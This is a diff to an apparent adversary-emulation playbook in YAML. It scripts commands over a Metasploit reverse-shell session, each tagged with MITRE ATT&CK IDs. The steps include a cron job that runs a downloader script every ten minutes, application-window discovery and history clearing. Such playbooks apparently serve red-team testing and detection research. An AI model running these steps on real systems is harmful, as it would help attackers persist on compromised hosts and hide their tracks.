@@ -814,6 +814,15 @@ commands:
       tactics: "Defense Evasion" 
       technique_name: "File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification"
 
+# find out which windows are open
+  - type: msf-session
+    session: revshell
+    cmd:  wmctrl -l
+    metadata:
+      techniques: "T1010"
+      tactics: "Discovery"
+      technique_name: "Application Window Discovery"
+
   # add the cronjob 
   - type: msf-session
     session: revshell
@@ -833,7 +842,7 @@ commands:
 
   - type: msf-session
     session: revshell
-    cmd: "*/10 * * * * /home/judy/download.sh"
+    cmd: "*/10 * * * * /home/judy/downloader.sh"
     metadata:
       techniques: "T1053.003"
       tactics: "Persistence"
@@ -867,15 +876,6 @@ commands:
       tactics: "Persistence"
       technique_name: "Scheduled Task/Job: Cron"
 
-  # find out which windows are open
-  - type: msf-session
-    session: revshell
-    cmd:  wmctrl -l
-    metadata:
-      techniques: "T1010"
-      tactics: "Discovery"
-      technique_name: "Application Window Discovery"
-
   # clear history
   - type: msf-session
     session: revshell
@@ -891,4 +891,4 @@ commands:
     cmd: exit
 
   - type: sleep
-    seconds: 30 
+    seconds: 900 
